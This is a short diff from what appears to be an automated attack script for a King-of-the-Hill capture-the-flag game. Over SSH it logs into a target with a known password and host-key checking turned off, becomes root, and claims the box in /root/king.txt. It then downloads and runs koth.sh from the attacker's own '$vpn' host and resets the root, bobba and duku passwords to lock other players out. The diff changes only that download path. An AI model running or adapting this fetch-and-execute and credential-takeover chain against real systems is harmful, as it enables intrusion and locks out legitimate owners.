@@ -35,7 +35,7 @@ sshpass -p "$bobba_password" ssh -o StrictHostKeyChecking=no bobba@"$IP" /bin/ba
   sleep 1
   sudo su
   echo "$username" >> /root/king.txt
-  cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
+  cd /boot && wget http://$vpn/Scripts/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
   echo "root:$new_password" | sudo chpasswd
   echo "bobba:$new_password" | sudo chpasswd
   echo "duku:$new_password" | sudo chpasswd
